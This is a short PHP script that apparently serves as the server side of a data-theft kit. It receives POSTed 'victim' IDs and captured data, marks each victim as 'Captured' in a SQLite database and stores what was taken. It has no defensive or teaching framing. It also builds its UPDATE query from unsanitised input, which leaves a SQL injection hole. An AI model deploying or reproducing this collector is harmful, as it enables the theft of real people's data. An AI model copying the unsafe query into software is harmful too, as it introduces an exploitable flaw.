<?php
$db = new SQLite3('victims.db');

if($_SERVER['REQUEST_METHOD'] === 'POST') {
    $victim_id = $_POST['victim_id'];
    $type = $_POST['type'];
    $data = $_POST['data'];
    $timestamp = time();
    
    // Update victim status
    $db->exec("UPDATE victims SET status='Captured' WHERE id='$victim_id'");
    
    // Save capture
    $stmt = $db->prepare("INSERT INTO captures (victim_id, type, data, timestamp) VALUES (?, ?, ?, ?)");
    $stmt->bindValue(1, $victim_id);
    $stmt->bindValue(2, $type);
    $stmt->bindValue(3, $data);
    $stmt->bindValue(4, $timestamp);
    $stmt->execute();
    
    echo "OK";
}
?>
